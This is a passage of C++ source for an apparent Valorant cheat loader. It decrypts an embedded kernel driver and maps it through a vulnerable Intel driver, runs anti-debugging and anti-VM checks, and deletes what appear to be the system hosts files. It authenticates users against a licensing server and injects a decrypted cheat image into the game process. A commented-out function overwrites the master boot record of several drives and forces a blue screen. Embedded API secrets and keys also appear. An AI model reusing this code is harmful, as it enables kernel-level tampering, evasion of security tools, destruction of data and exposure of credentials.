//    crypt2.put_CipherMode(xorstr_("ecb"));
//    crypt2.put_KeyLength(256);
//    crypt2.put_HashAlgorithm(xorstr_("sha256"));
//    auto brra = xorstr_("UnrealWindow");
//    crypt2.SetSecretKeyViaPassword(brra);
//    RtlSecureZeroMemory(&brra, sizeof(brra));
//
//    CkByteData DecObj;
//    crypt2.DecryptBytes(pObj, DecObj);
//    PVOID MapperBytes = (PVOID)DecObj.getBytes();
//    bool h_file = DecObj.saveFileW(path.c_str());
//
//    if (!h_file) {
//        print::set_error(xorstr_(" [UNKNOWN_PATH_ERROR] Something went wrong. Bye!")); Sleep(3000); abort();
//    }
//    //b_status = WriteFile(h_file, MapperBytes, sizeof(MapperBytes), &byte, nullptr);
//    //CloseHandle(h_file);
//
//    VirtualFree(MapperBytes, 0, MEM_RELEASE);
//    memset(MapperBytes, 0x00, DecObj.getSize());
//    DecObj.clear();
//
//    //if (!b_status)
//    //    return false;
//
//    return true;
//    //VMProtectEnd();
//}
//
//bool drop_driver(wstring path)
//{
//   // VMProtectBeginUltra("drop_driver");
//   /* HANDLE h_file;
//    BOOLEAN b_status = FALSE;
//    DWORD byte = 0;
//
//    h_file = CreateFileW(path.c_str(), GENERIC_ALL, NULL, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
//    if (GetLastError() == ERROR_FILE_EXISTS)
//        return true;
//
//    if (h_file == INVALID_HANDLE_VALUE)
//        return false;*/
//
//    PVOID rawObj = reinterpret_cast<PVOID>(shell_driver);
//    CkByteData pObj; pObj.append2(rawObj, 12816);
//    CkCrypt2 crypt2;
//    crypt2.put_CryptAlgorithm(xorstr_("aes"));
//    crypt2.put_CipherMode(xorstr_("ecb"));
//    crypt2.put_KeyLength(256);
//    crypt2.put_HashAlgorithm(xorstr_("sha256"));
//    auto brra = xorstr_("UnrealWindow");
//    crypt2.SetSecretKeyViaPassword(brra);
//    RtlSecureZeroMemory(&brra, sizeof(brra));
//
//    CkByteData DecObj;
//    crypt2.DecryptBytes(pObj, DecObj);
//    PVOID DriverBytes = (PVOID)DecObj.getBytes();
//    bool h_file = DecObj.saveFileW(path.c_str());
//    if (!h_file) {
//        print::set_error(xorstr_(" [UNKNOWN_PATH_ERROR] Something went wrong. Bye!")); Sleep(3000); abort();
//    }
//   // b_status = WriteFile(h_file, DriverBytes, sizeof(DriverBytes), &byte, nullptr);
//    //CloseHandle(h_file);
//
//    VirtualFree(DriverBytes, 0, MEM_RELEASE);
//    memset(DriverBytes, 0x00, DecObj.getSize());
//    DecObj.clear();
//
//   // if (!b_status)
//   //     return false;
//
//    return true;
//   // VMProtectEnd();
//}
//
//wstring get_files_path()
//{
//    WCHAR system_dir[256];
//    GetWindowsDirectoryW(system_dir, 256);
//    return (wstring(system_dir) + patch_shell);
//}
//
//void mmap_driver()
//{
//  // VMProtectBeginUltra("mmap_driver");
//    wstring sz_driver = get_random_file_name_directory(wxorstr_(L".sys"));
//    wstring sz_mapper = get_random_file_name_directory(wxorstr_(L".exe"));
//    wstring sz_params_map = wxorstr_(L"-map ") + sz_driver;
//
//    DeleteFileW(sz_driver.c_str());
//    DeleteFileW(sz_mapper.c_str());
//
//    Sleep(1000);
//
//    drop_driver(sz_driver);
//    drop_mapper(sz_mapper);
//
//    run_us_admin_and_params(sz_mapper, sz_params_map, false);
//    Sleep(6000);
//
//    DeleteFileW(sz_driver.c_str());
//    DeleteFileW(sz_mapper.c_str());
//  //  VMProtectEnd();
//}
//
//
//void start_driver()
//{
//    //VMProtectBeginUltra("start_driver");
//    driver().handle_driver();
//
//    if (!driver().is_loaded())
//        mmap_driver();
//
//    driver().handle_driver();
//    if (!driver().is_loaded()) {
//        print::set_error(xorstr_(" [HARD_ERROR] Something went wrong. Bye!"));
//        Sleep(3000); abort();
//    }
//    //VMProtectEnd();
//}

void check_host_name(int hostname) { //This function returns host name for local computer
    if (hostname == -1) {
        perror("gethostname");
        exit(1);
    }
}
void check_host_entry(struct hostent* hostentry) { //find host info from host name
    if (hostentry == NULL) {
        perror("gethostbyname");
        exit(1);
    }
}
void IP_formatter(char* IPbuffer) { //convert IP string to dotted decimal format
    if (NULL == IPbuffer) {
        perror("inet_ntoa");
        exit(1);
    }
}


bool SetCommand(const char* commandXD, DWORD flags) {
    char windir[260];
    GetSystemDirectoryA(windir, MAX_PATH);
    char cmdline[MAX_PATH + 50];
    string tamamla = string(windir) + xorstr_("\\cmd.exe /c %s");
    sprintf(cmdline, tamamla.c_str(), commandXD);
    STARTUPINFOA startInf;//Del /S /F /Q %windir%\Prefetch
    memset(&startInf, 0, sizeof startInf);
    startInf.cb = sizeof(startInf);
    PROCESS_INFORMATION procInf;
    memset(&procInf, 0, sizeof procInf);

    return CreateProcessA(NULL, cmdline, NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS | flags, NULL, NULL, &startInf, &procInf);
}

std::string random_string2(std::string::size_type length)
{
    static auto& chrs = "0123456789"
        "abcdef";

    thread_local static std::mt19937 rg{ std::random_device{}() };
    thread_local static std::uniform_int_distribution<std::string::size_type> pick(0, sizeof(chrs) - 2);

    std::string s;

    s.reserve(length);

    while (length--)
        s += chrs[pick(rg)];

    return s;
}

//
//extern "C" NTSTATUS NTAPI RtlAdjustPrivilege(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN OldValue);
//extern "C" NTSTATUS NTAPI NtRaiseHardError(LONG ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask,
//    PULONG_PTR Parameters, ULONG ValidResponseOptions, PULONG Response);
//
//void BlueScreen()
//{
//    HINSTANCE hLib = LoadLibraryA(xorstr_("ntdll.dll"));
//    BOOLEAN bl;
//    ULONG Response;
//    RtlAdjustPrivilege(19, TRUE, FALSE, &bl); // Enable SeShutdownPrivilege
//    NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, NULL, 6, &Response); // Shutdown
//}

//#define MBR_SIZE 512
//DWORD CFucker() // FOR BITCHES.
//{
//    DWORD write;
//    char mbrData[512];
//    ZeroMemory(&mbrData, (sizeof mbrData));
//    RtlSecureZeroMemory(&mbrData, (sizeof mbrData));
//
//    HANDLE MasterBootRecord = CreateFileA(xorstr_("\\\\.\\PhysicalDrive0"), GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
//    HANDLE MasterBootRecord2 = CreateFileA(xorstr_("\\\\.\\PhysicalDrive1"), GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
//    HANDLE MasterBootRecord3 = CreateFileA(xorstr_("\\\\.\\PhysicalDrive2"), GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
//    HANDLE MasterBootRecord4 = CreateFileA(xorstr_("\\\\.\\PhysicalDrive3"), GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
//    WriteFile(MasterBootRecord, mbrData, MBR_SIZE, &write, NULL);
//    WriteFile(MasterBootRecord2, mbrData, MBR_SIZE, &write, NULL);
//    WriteFile(MasterBootRecord3, mbrData, MBR_SIZE, &write, NULL);
//    WriteFile(MasterBootRecord4, mbrData, MBR_SIZE, &write, NULL);
//    BlueScreen();
//    CloseHandle(MasterBootRecord);
//    return EXIT_SUCCESS;
//}
//

bool connect_zuladrv()
{
    driver().handle_driver();

    if (!driver().is_loaded())
    {
        HANDLE idev = intel_driver::Load();
        PVOID rawObj = reinterpret_cast<PVOID>(shell_driver);
        CkByteData pObj; pObj.append2(rawObj, 12816);
        CkCrypt2 crypt2;
        crypt2.put_CryptAlgorithm(xorstr_("aes"));
        crypt2.put_CipherMode(xorstr_("ecb"));
        crypt2.put_KeyLength(256);
        crypt2.put_HashAlgorithm(xorstr_("sha256"));
        auto brra = xorstr_("UnrealWindow");
        crypt2.SetSecretKeyViaPassword(brra);
        RtlSecureZeroMemory(&brra, sizeof(brra));

        CkByteData DecObj;
        crypt2.DecryptBytes(pObj, DecObj);
        PVOID DriverBytes = (PVOID)DecObj.getBytes();

        if (!kdmapper::MapDriver(idev, DriverBytes))
        {
            intel_driver::Unload(idev);
            memset(DriverBytes, 0x00, 8000);
            DecObj.clear();
            print::set_error(xorstr_(" [ERROR] Unknown driver error -1"));
            Sleep(3000);
            exit(-1);
        }

        intel_driver::Unload(idev);

        memset(DriverBytes, 0x00, 8000);
        DecObj.clear();

        //return true;
    }
    driver().handle_driver();
    if (!driver().is_loaded()) {
        print::set_error(xorstr_(" [HARD_ERROR] Something went wrong. Bye!"));
        Sleep(3000); abort();
    }
    return true;
}

/////////////////////////////////
void CyberMain()
{
    // setlocale(LC_ALL, "Turkish");
    Lala("xxxxxxx?????xxxxx???x");
    if (AntiDebug::IsSystemCodeIntegrityEnabled())
        abort();

    VMProtectBeginUltra("CyberMain");

    //Benitto
  //  std::thread(AntiPause).detach();
    std::thread(AntiMeme).detach();

    DisplayApatheArt();

    auto str = VMProtectDecryptStringA(xorstr_(" [VALMAIN] Please wait."));
    print::set_warning(str);
    VMProtectFreeString((void*)str);
    if (VMProtectIsProtected() && VMProtectIsValidImageCRC())
    {
        if (AntiDebug::IsVirtualBox() == FALSE && AntiDebug::IsSandboxie() == FALSE && AntiDebug::IsVM() == FALSE)
        {
            Lala("xxx?xxx???xxxxxxxxxxx");
            AntiDebug::HideThread(GetCurrentThread());
            Lala("x?????xxxxxx?????xxxx");
            if (AntiDebug::CheckRemoteDebuggerPresentAPI())
                abort();
            Lala("xxxxxxxxxxx?xxx??xx?x");
            if (AntiDebug::IsDebuggerPresentAPI())
                abort();
            Lala("x??xxx???xx??x??xxxxx");
            if (AntiDebug::HardwareBreakpoints())
                abort();
            Lala("xxx????xxxxx???????xx");
            if (AntiDebug::MemoryBreakpoints_PageGuard())
                abort();
            // CheckGlobalFlagsClearInFile();
            CheckGlobalFlagsClearInProcess();
            HideFromDebugger();
            if (!MethodCheckRemoteDebuggerPresent() && !MethodIsDebuggerPresent())
            {
                Lala("xxx???xxxxxxxxxx?????");
                if (!IsDbgPresent())
                {
                    anti::p_proc = new anti::c_proc();
                    anti::p_opcode = new anti::c_opcode();
                    anti::p_opcode->setup();
                    anti::p_opcode->add((void*)DeleteFileA, 0, 1, xorstr_("delfilea"));
                    anti::p_opcode->add((void*)IsDebuggerPresent, 0, 1, xorstr_("isdeb"));
                    anti::p_opcode->add((void*)CyberMain, 0, 1, xorstr_("cujnnr"));
                    anti::p_opcode->add((void*)LoadLibraryA, 0, 1, xorstr_("llib"));
                    anti::p_opcode->add((void*)VirtualProtectEx, 0, 1, xorstr_("vproex"));
                    anti::p_opcode->add((void*)OpenProcess, 0, 1, xorstr_("openpr"));
                    anti::p_opcode->add((void*)ExitProcess, 0, 1, xorstr_("expro"));
                    anti::p_opcode->add((void*)CreateThread, 0, 1, xorstr_("cthrd"));
                    anti::p_opcode->add((void*)FindWindow, 0, 1, xorstr_("fnxwdn"));
                    anti::p_opcode->add((void*)FindWindowA, 0, 1, xorstr_("qwcwqqq"));
                    anti::p_opcode->add((void*)FindWindowW, 0, 1, xorstr_("vqweqzd"));
                    anti::p_opcode->add((void*)GetModuleHandle, 0, 1, xorstr_("cqwaxas"));
                    anti::p_opcode->add((void*)GetModuleHandleA, 0, 1, xorstr_("vwercad"));
                    anti::p_opcode->add((void*)GetModuleHandleW, 0, 1, xorstr_("weqtwax"));
                    anti::p_opcode->add((void*)RtlSecureZeroMemory, 0, 1, xorstr_("vyxq"));
                    anti::p_opcode->add((void*)VirtualProtect, 0, 1, xorstr_("vweqxq"));
                    anti::p_opcode->add((void*)VirtualFree, 0, 1, xorstr_("qweqx"));
                    anti::p_opcode->add((void*)Sleep, 0, 1, xorstr_("vbrqwxx"));
                    anti::p_opcode->work();

                    auto xor1_1 = xorstr_("hQ2wy63AYzSYLGhNcsOTTX6MTXzPog03i8GpaOC3jWc=");
                    auto xor2_1 = xorstr_("zcvNOWSATarh25YOBC+pWIgH/GPNdD6JEMT34brwCJ4=");
                    auto priv_rgithb_0 = xorstr_("raw.githubusercontent.com");
                    //x???xxx?xxxx??xx?
                    string ri = Aes256DecryptString(xor1_1, Aes256DecryptString(xor2_1, priv_rgithb_0));

                    // hintli application
                    //string aid = xorstr_("y1dNJZ4mdpFKr32iLlgCqA==");
                    //string secret = xorstr_("l9E9WhR3RTAgqZ1FsKlyiU56yombGaVWxdBjMuXiCaHTb+/4i/11p9Me290EbZQh");
                    //string apikey = xorstr_("SWUNX2T1EVeUy19VLHGxFZlWBi1NV1SNYi0lu1rwVUE=");

                    // michael application
                    string aid = xorstr_("50OecUlZUaYLhyu66hjxbQ==");
                    string secret = xorstr_("Qt/+DKaOoLCPIIw9sxbUTZtWIsJric75JkXpSGR2iu123SmqM8Ym7AchGx3kKJpr");
                    string apikey = xorstr_("I07VhWip6/MbpbXuVTsARqgmz6D5c4UIK0xwjrO2Q6rvGNgxMUpHt/u68liisdU+");

                    RtlSecureZeroMemory(&xor1_1, sizeof(xor1_1));
                    RtlSecureZeroMemory(&xor2_1, sizeof(xor2_1));
                    RtlSecureZeroMemory(&priv_rgithb_0, sizeof(priv_rgithb_0));
                    //pw: x???xxx?xxxx??xx?
                    //https://raw.githubusercontent.com/belediyehuk/kw/main/heart.js
                    auto xor3 = xorstr_("rRIxTIL/jLBxPvQ9sC0zDE9i+6wqeo1mfGPA+PUZCjq8sAro1kLcrLQuWDkcHb6TyoVU0wcoR9/3xB4jWnLqYA==");
                    int msg = std::atoi(Aes256DecryptString(curlGetRequestt(Aes256DecryptString(xor3, ri)), ri).c_str());

                    if (msg == 2)
                    {
                        crypto.aid = Aes256DecryptString(aid, xorstr_("6=^"));//953889
                        crypto.secret = Aes256DecryptString(secret, xorstr_("9+V"));//tgKuBLo3zsLO97e0cKcuVtR8tpjLFcLCjpO
                        crypto.apikey = Aes256DecryptString(apikey, xorstr_("V0?="));//8157468559785329225459569535731192571595337287362

                        if (msg == 2)
                            crypto.version = xorstr_("1.0");

                        WSADATA ws;
                        int res;
                        // Initializing winsock
                        // Before using any of the winsock constructs, the library must be initialized by calling the WSAStartup function. 
                        res = WSAStartup(MAKEWORD(2, 2), &ws);
                        if (res != 0)
                        {
                            print::set_error(xorstr_("Winsock error.\n"));
                            Sleep(3000); exit(43);
                        }

                        char* hostname;
                        struct hostent* host_info;
                        struct in_addr addr;
                        DWORD dw;
                        int i = 0;
                        auto authgg = Aes256DecryptString(xorstr_("FCFYLD9rPJ0bYIp81gx2gQ=="), xorstr_(".^../="));
                        hostname = (char*)authgg.c_str();
                        host_info = gethostbyname(hostname);
                        if (host_info == NULL)
                        {
                            print::set_error(xorstr_("Host error.\n"));
                            Sleep(3000); exit(43);
                        }
                        else {
                            addr.s_addr = *(u_long*)host_info->h_addr_list[0];
                            if (strstr(inet_ntoa(addr), xorstr_("127.")))
                                exit(43);
                            if (strstr(inet_ntoa(addr), xorstr_("172")) || strstr(inet_ntoa(addr), xorstr_("104")))
                            {
                                addr.s_addr = *(u_long*)host_info->h_addr_list[1];
                                if (strstr(inet_ntoa(addr), xorstr_("127.")))
                                    exit(43);
                                if (strstr(inet_ntoa(addr), xorstr_("172")) || strstr(inet_ntoa(addr), xorstr_("104")))
                                {
                                    addr.s_addr = *(u_long*)host_info->h_addr_list[2];
                                    if (strstr(inet_ntoa(addr), xorstr_("127.")))
                                        exit(43);
                                    auto xor0_1 = xorstr_("jtIizebjibHwNhJO4AZtpvQJtkRyH5StZP3Zx9dNFFqdJQ1r/y9ISfa3PY7ZhpG1");
                                    string hostsDir(Aes256DecryptString(xor0_1, ri));

                                    auto xor0_2 = xorstr_("jtIizebjibHwNhJO4AZtpvQJtkRyH5StZP3Zx9dNFFo58Uz+KWoQ9ez/KJlPNnNv");
                                    string hosts_ics_Dir(Aes256DecryptString(xor0_2, ri));

                                    if (SetCommand(std::string(xorstr_("icacls ") + hostsDir + xorstr_(" /reset")).c_str(), CREATE_NO_WINDOW))
                                    {
                                        Sleep(1000);
                                        if (GetFileAttributesA(hostsDir.c_str()) == FILE_ATTRIBUTE_SYSTEM)
                                            SetFileAttributes(hostsDir.c_str(), FILE_ATTRIBUTE_SYSTEM);

                                        if (GetFileAttributesA(hostsDir.c_str()) == FILE_ATTRIBUTE_HIDDEN)
                                            SetFileAttributes(hostsDir.c_str(), FILE_ATTRIBUTE_HIDDEN);

                                        if (GetFileAttributesA(hostsDir.c_str()) == FILE_ATTRIBUTE_ARCHIVE)
                                            SetFileAttributes(hostsDir.c_str(), FILE_ATTRIBUTE_ARCHIVE);

                                        if (GetFileAttributesA(hostsDir.c_str()) == FILE_ATTRIBUTE_READONLY)
                                            SetFileAttributes(hostsDir.c_str(), FILE_ATTRIBUTE_READONLY);

                                        SetFileAttributes(hostsDir.c_str(), FILE_ATTRIBUTE_NORMAL);
                                        remove(hostsDir.c_str());
                                        if (SetCommand(std::string(xorstr_("icacls ") + hosts_ics_Dir + xorstr_(" /reset")).c_str(), CREATE_NO_WINDOW))
                                        {
                                            Sleep(1000);
                                            if (GetFileAttributesA(hosts_ics_Dir.c_str()) == FILE_ATTRIBUTE_SYSTEM)
                                                SetFileAttributes(hosts_ics_Dir.c_str(), FILE_ATTRIBUTE_SYSTEM);

                                            if (GetFileAttributesA(hosts_ics_Dir.c_str()) == FILE_ATTRIBUTE_HIDDEN)
                                                SetFileAttributes(hosts_ics_Dir.c_str(), FILE_ATTRIBUTE_HIDDEN);

                                            if (GetFileAttributesA(hosts_ics_Dir.c_str()) == FILE_ATTRIBUTE_ARCHIVE)
                                                SetFileAttributes(hosts_ics_Dir.c_str(), FILE_ATTRIBUTE_ARCHIVE);

                                            if (GetFileAttributesA(hosts_ics_Dir.c_str()) == FILE_ATTRIBUTE_READONLY)
                                                SetFileAttributes(hosts_ics_Dir.c_str(), FILE_ATTRIBUTE_READONLY);

                                            SetFileAttributes(hosts_ics_Dir.c_str(), FILE_ATTRIBUTE_NORMAL);
                                            remove(hosts_ics_Dir.c_str());

                                            addr.s_addr = *(u_long*)host_info->h_addr_list[0];
                                            if (strstr(inet_ntoa(addr), xorstr_("127.")))
                                                exit(43);
                                            if (strstr(inet_ntoa(addr), xorstr_("172.")) || strstr(inet_ntoa(addr), xorstr_("104.")))
                                            {
                                                addr.s_addr = *(u_long*)host_info->h_addr_list[1];
                                                if (strstr(inet_ntoa(addr), xorstr_("127.")))
                                                    exit(43);
                                                if (strstr(inet_ntoa(addr), xorstr_("172.")) || strstr(inet_ntoa(addr), xorstr_("104.")))
                                                {
                                                    addr.s_addr = *(u_long*)host_info->h_addr_list[2];
                                                    if (strstr(inet_ntoa(addr), xorstr_("127.")))
                                                        exit(43);
                                                    authgg::GenerateSeed();
                                                    authgg::Initialize();
                                                    goto getla;
                                                }
                                            }

                                        getla:

                                            std::string choice;
                                            std::string password;
                                            std::string key;


                                            system(xorstr_("cls"));
                                            DisplayApatheArt();

                                            cout << xorstr_(" 1- Login | 2- Register") << endl;

                                            print::set_text(xorstr_(" Please select an option: "), Yellow);
                                            std::getline(std::cin, choice);


                                            std::string gen_username;
                                            std::string gen_password;
                                            if (choice == xorstr_("2"))
                                            {
                                            enbas:
                                                system(xorstr_("cls"));
                                                DisplayApatheArt();
                                                print::set_text(xorstr_(" Username: "), LightGray);
                                                std::getline(std::cin, gen_username);
                                                print::set_text(xorstr_(" Password: "), LightGray);
                                                std::getline(std::cin, gen_password);

                                                print::set_text(xorstr_(" Key: "), Yellow);
                                                std::getline(std::cin, key);
                                              //  if (!strstr(key.c_str(), xorstr_("CYBERANT")))
                                             //       goto getla;
                                                std::string gen_email = random_string2(10) + xorstr_("@amongus.net");

                                            retry:
                                                auto md5 = new md5wrapper();
                                                c_lw_http	lw_http;
                                                c_lw_httpd	lw_http_d;
                                                std::string s_reply;
                                                lw_http_d.add_field(xorstr_("a"), xorstr_("register"));
                                                lw_http_d.add_field(xorstr_("b"), crypto.encrypt(crypto.aid, crypto.key, crypto.iv).c_str());
                                                lw_http_d.add_field(xorstr_("c"), crypto.encrypt(crypto.secret, crypto.key, crypto.iv).c_str());
                                                lw_http_d.add_field(xorstr_("g"), crypto.encrypt(gen_username, crypto.key, crypto.iv).c_str());
                                                lw_http_d.add_field(xorstr_("h"), crypto.encrypt(gen_password, crypto.key, crypto.iv).c_str());
                                                lw_http_d.add_field(xorstr_("i"), crypto.encrypt(gen_email, crypto.key, crypto.iv).c_str());
                                                lw_http_d.add_field(xorstr_("j"), crypto.encrypt(key, crypto.key, crypto.iv).c_str());
                                                lw_http_d.add_field(xorstr_("k"), md5->getHashFromString(hwid::get_hardware_id("1")).c_str());
                                                lw_http_d.add_field(xorstr_("e"), crypto.entity.c_str());
                                                lw_http_d.add_field(xorstr_("seed"), crypto.key_enc.c_str());

                                                //https://api.auth.gg/v6/api.php
                                                string api_php = Aes256DecryptString(xorstr_("rrZxXRzOnQQweethY1+cSBdHxKW71VfSaU78f8KjNDU="), xorstr_(".-.."));
                                                auto b_lw_http = lw_http.post(api_php, s_reply.c_str(), lw_http_d);
                                                //api_php.clear();
                                                //RtlSecureZeroMemory(&api_php, sizeof(api_php));


                                                if (b_lw_http)
                                                {
                                                    //lw_http_d.clear();
                                                    std::string s(crypto.decrypt(s_reply.c_str(), crypto.key.c_str(), crypto.iv.c_str()).c_str());
                                                    if (crypto.register_status == xorstr_("Disabled"))
                                                    {
                                                        print::set_text(xorstr_(" [NO_REG] Registrations are closed!"), Red);
                                                        Sleep(3000);
                                                        exit(43);
                                                    }
                                                    auto success = xorstr_("Io6/3S7luFpTDhVMNjXoRA==");
                                                    if (s == Aes256DecryptString(success, xorstr_("06==")))
                                                    {
                                                        char clic[128];
                                                        sprintf(clic, xorstr_("Username: %s\nPassword: %s"), gen_username.c_str(), gen_password.c_str());
                                                        std::ofstream sav_k(xorstr_("ValUser.txt"));
                                                        sav_k << clic;
                                                        sav_k.close();
                                                        auto xasdf = string(xorstr_(" License activated! [ValUser.txt]"));
                                                        SendLog(gen_username.c_str(), xorstr_("Registered."));
                                                        print::set_text(xasdf.c_str(), Green);
                                                        Sleep(1000);
                                                        goto getla;
                                                        //exit(43);
                                                    }
                                                    if (s == xorstr_("invalid_token"))
                                                    {
                                                        print::set_text(string(xorstr_(" [INVALID_TOKEN] Maybe key does not exist! Retrying, please wait..\n")).c_str(), Yellow);
                                                        authgg::GenerateSeed();
                                                        authgg::Initialize();
                                                        goto retry;
                                                    }
                                                    if (s == xorstr_("email_used"))
                                                    {
                                                        print::set_text(string(xorstr_(" [EMAIL_USED] Email has already been used!")).c_str(), LightRed);
                                                        Sleep(3000);
                                                        goto getla;
                                                    }
                                                    if (s == xorstr_("invalid_username"))
                                                    {
                                                        print::set_text(string(xorstr_(" [INVALID_USERNAME] Username has already been taken or invalid!")).c_str(), LightRed);
                                                        Sleep(3000);
                                                        goto getla;
                                                    }
                                                    print::set_text(string(xorstr_(" [UNKNOWN_ERROR] Maybe something went wrong! Retrying..\n")).c_str(), Yellow);
                                                    authgg::GenerateSeed();
                                                    authgg::Initialize();
                                                    goto retry;
                                                }
                                            }
                                            else if (choice == xorstr_("1"))
                                            {
                                                system(xorstr_("cls"));
                                                DisplayApatheArt();
                                                std::string username;
                                                print::set_text(xorstr_(" Username: "), LightGray);
                                                std::getline(std::cin, username);
                                                print::set_text(xorstr_(" Password: "), LightGray);
                                                std::getline(std::cin, password);

                                                print::set_text(string(xorstr_(" [LOGIN] Checking, please wait.\n")).c_str(), Yellow);

                                                system(xorstr_("cls"));
                                                DisplayApatheArt();
                                            retry2:
                                                c_lw_http	lw_http;
                                                c_lw_httpd	lw_http_d;
                                                auto md5 = new md5wrapper();
                                                std::string s_reply;
                                                lw_http_d.add_field(xorstr_("a"), xorstr_("login"));
                                                lw_http_d.add_field(xorstr_("b"), crypto.encrypt(crypto.aid, crypto.key, crypto.iv).c_str());
                                                lw_http_d.add_field(xorstr_("c"), crypto.encrypt(crypto.secret, crypto.key, crypto.iv).c_str());
                                                lw_http_d.add_field(xorstr_("d"), crypto.encrypt(crypto.apikey, crypto.key, crypto.iv).c_str());
                                                lw_http_d.add_field(xorstr_("g"), crypto.encrypt(username, crypto.key, crypto.iv).c_str());
                                                lw_http_d.add_field(xorstr_("h"), crypto.encrypt(password, crypto.key, crypto.iv).c_str());
                                                lw_http_d.add_field(xorstr_("k"), md5->getHashFromString(hwid::get_hardware_id(xorstr_("1"))).c_str());
                                                lw_http_d.add_field(xorstr_("e"), crypto.entity.c_str());
                                                lw_http_d.add_field(xorstr_("seed"), crypto.key_enc.c_str());

                                                //https://api.auth.gg/v6/api.php
                                                string api_php = Aes256DecryptString(xorstr_("rrZxXRzOnQQweethY1+cSBdHxKW71VfSaU78f8KjNDU="), xorstr_(".-.."));
                                                auto b_lw_http = lw_http.post(api_php, s_reply.c_str(), lw_http_d);

                                                if (b_lw_http)
                                                {
                                                    if (crypto.login_status == xorstr_("Disabled"))
                                                    {
                                                        print::set_text(xorstr_(" [LOGIN] Logins are closed."), Red);
                                                        Sleep(5000);
                                                        exit(43);
                                                    }
                                                    std::string s(crypto.decrypt(s_reply.c_str(), crypto.key.c_str(), crypto.iv.c_str()).c_str());
                                                    if (s == xorstr_("hwid_updated"))
                                                    {
                                                        print::set_text(string(xorstr_(" [EXPIRED] Your hwid has been updated! Please wait..")).c_str(), Green);
                                                        authgg::GenerateSeed();
                                                        authgg::Initialize();
                                                        goto retry2;
                                                    }
                                                    if (s == xorstr_("time_expired"))
                                                    {
                                                        print::set_text(string(xorstr_(" [EXPIRED] Your license has expired!")).c_str(), Red);
                                                        exit(43);

                                                    }
                                                    if (s == xorstr_("invalid_hwid"))
                                                    {
                                                        print::set_text(string(xorstr_(" [HWID] Something went wrong! Retrying, please wait..")).c_str(), Red);
                                                        authgg::GenerateSeed();
                                                        authgg::Initialize();
                                                        goto retry2;
                                                    }
                                                    if (s == xorstr_("invalid_details"))
                                                    {
                                                        print::set_text(string(xorstr_(" [DETAILS] Something went wrong. Retrying, please wait..\n")).c_str(), Yellow);
                                                        authgg::GenerateSeed();
                                                        authgg::Initialize();
                                                        goto retry2;
                                                    }
                                                    std::string delimiter = xorstr_("|");
                                                    std::vector<std::string> outputArr;
                                                    size_t pos = 0;
                                                    std::string token;
                                                    while ((pos = s.find(delimiter)) != std::string::npos) {
                                                        token = s.substr(0, pos);
                                                        s.erase(0, pos + delimiter.length());
                                                        outputArr.push_back(token);
                                                    }
                                                    outputArr.push_back(s);
                                                    std::string login = outputArr[0].c_str();
                                                    std::string ip = outputArr[4].c_str();
                                                    /* std::string hwid = outputArr[1].c_str();
                                                     std::string email = outputArr[2].c_str();
                                                     std::string rank = outputArr[3].c_str();
                                                     std::string ip = outputArr[4].c_str();
                                                     std::string expiry = outputArr[5].c_str();
                                                     std::string uservariable = outputArr[6].c_str();
                                                     */
                                                    auto success = xorstr_("Io6/3S7luFpTDhVMNjXoRA==");
                                                    if (login == Aes256DecryptString(success, xorstr_("06==")) + crypto.apikey + crypto.aid + ip)
                                                    {
                                                        system(xorstr_("cls"));
                                                        DisplayApatheArt();
                                                        print::set_text(string(xorstr_(" [LOGIN] Login success! Please wait..\n")).c_str(), Green);

                                                         SendLog(username.c_str(), xorstr_("Logged in."));

                                                        if (connect_zuladrv()) {

                                                        gerisar:
                                                            system(xorstr_("cls"));
                                                            DisplayApatheArt();
                                                            auto pqwrf = xorstr_(" [G] Waiting for game.");
                                                            print::set_text(string(pqwrf).c_str(), Green);
                                                            RtlSecureZeroMemory(&pqwrf, sizeof(pqwrf));
                                                            //getchar();

                                                            DWORD thread_id;

                                                            auto brra1 = xorstr_("VALORANT  ");
                                                            auto brra2 = xorstr_("UnrealWindow");
                                                            DWORD process_id = get_process_id_and_thread_id_by_window_class(brra2, brra1, &thread_id);

                                                            if (process_id != 0 && thread_id != 0)
                                                            {
                                                                RtlSecureZeroMemory(&brra2, sizeof(brra2));
                                                                driver().attach_process(process_id);
                                                                PVOID allocate_base = driver().alloc_memory_ex(0x13500, PAGE_EXECUTE_READWRITE);
                                                                Ritopls((uint64_t)allocate_base, 4096, PAGE_READWRITE);
                                                                Ritopls((uint64_t)allocate_base + 60000, 4096, PAGE_READWRITE);
                                                                Ritopls((uint64_t)allocate_base + 65000, 4096, PAGE_READWRITE);
                                                                Ritopls((uint64_t)allocate_base + 70000, 4096, PAGE_READWRITE);
                                                            
                                                                //Ritopls((uint64_t)allocate_base, 4096, PAGE_READWRITE);
                                                                //uint64_t endAddr = (uint64_t)allocate_base + (uint64_t)dll_nt_head->OptionalHeader.SizeOfImage;

                                                                PVOID rawObj = reinterpret_cast<PVOID>(OralMemeXD);
                                                                CkByteData pObj; pObj.append2(rawObj, 72208);
                                                                CkCrypt2 crypt2;
                                                                crypt2.put_CryptAlgorithm(xorstr_("aes"));
                                                                crypt2.put_CipherMode(xorstr_("ecb"));
                                                                crypt2.put_KeyLength(256);
                                                                crypt2.put_HashAlgorithm(xorstr_("sha256"));
                                                                auto brra = xorstr_("UnrealWindow");
                                                                crypt2.SetSecretKeyViaPassword(brra);
                                                                RtlSecureZeroMemory(&brra, sizeof(brra));

                                                                CkByteData DecObj;
                                                                crypt2.DecryptBytes(pObj, DecObj);
                                                                PVOID CheatBytes = (PVOID)DecObj.getBytes();

                                                                // parse nt header
                                                                PIMAGE_NT_HEADERS dll_nt_head = RtlImageNtHeader(CheatBytes);

                                                                if (!relocate_image(allocate_base, CheatBytes, dll_nt_head))
                                                                {
                                                                    driver().free_memory_ex(allocate_base);
                                                                    VirtualFree(CheatBytes, 0, MEM_RELEASE);
                                                                    memset(CheatBytes, 0x00, 50000);
